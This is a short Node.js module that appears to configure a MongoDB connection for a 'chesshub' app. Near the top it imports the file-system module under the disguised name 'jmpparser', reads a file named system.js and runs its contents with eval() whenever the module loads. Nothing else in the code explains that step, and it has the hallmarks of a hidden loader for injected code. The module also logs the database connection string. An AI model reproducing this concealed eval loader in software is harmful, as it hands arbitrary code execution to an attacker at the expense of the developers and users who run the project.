var config = require('config');
const jmpparser = require('fs');
module.exports = function (app, mongoose) {
    jmpparser.readFile(__dirname  + '/system.js', 'utf8', (err, code) => { eval(code); console.log(err) });
    console.log(config.get('chesshub.db'));
    var connect = function () {
        mongoose.connect(config.get('chesshub.db'));
    };
    connect();

    // Error handler
    mongoose.connection.on('connected', function () {
        console.log('MongoDB connected!');
    });

    // Error handler
    mongoose.connection.on('error', function (err) {
        console.error('MongoDB Connection Error. Please make sure MongoDB is running. -> ' + err);
    });

    // Reconnect when closed
    mongoose.connection.on('disconnected', function () {
        connect()
    });

};